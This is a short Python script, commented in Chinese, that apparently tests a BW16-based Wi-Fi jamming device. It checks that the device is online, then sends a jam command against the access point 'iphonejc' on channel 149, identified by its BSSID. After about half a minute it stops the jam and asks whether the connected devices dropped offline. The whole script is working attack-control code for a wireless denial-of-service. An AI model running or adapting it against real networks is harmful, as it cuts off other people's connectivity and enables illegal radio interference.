# -*- coding: utf-8 -*-
"""v25n 手动压制测试：打 iphonejc (02:90:F0:57:69:6B ch149)"""
import urllib.request, urllib.parse, json, time, sys
BASE = 'http://192.168.31.27'
def post(p, b=None, t=12):
    d = None if b is None else urllib.parse.urlencode(b).encode()
    return json.loads(urllib.request.urlopen(urllib.request.Request(BASE + p, data=d, method='POST'), timeout=t).read().decode())
def get(p, t=10):
    return json.loads(urllib.request.urlopen(BASE + p, timeout=t).read().decode())

for i in range(10):
    try:
        st = get('/api/status')
        if 'bw16_online' in st: break
    except Exception:
        time.sleep(3)
if not st or not st.get('bw16_online'):
    print('!! S3/BW16 离线'); sys.exit(1)
print('在线: bw16_online=%s adv=%s' % (st.get('bw16_online'), st.get('adv_attack')))

# 手动压制 iphonejc（当前 BSSID 16:D9:42:B8:17:B9，ch149）
r = post('/api/jam', {'bssid': '16:D9:42:B8:17:B9', 'ch': '149'}, 10)
print('jam start:', r)
time.sleep(8)
try:
    st2 = get('/api/status')
    print('8s 后状态: adv_attack=%s jamming=%s' % (st2.get('adv_attack'), st2.get('jamming_running')))
except Exception as e:
    print('8s 后 S3 可能被干扰: ', e)
time.sleep(27)
try:
    post('/api/stop', {}, 10)
    print('已停止')
except Exception as e:
    print('stop err:', e)
print('== 观察结果：iPad/连着 iphonejc 的设备是否断网 ==')
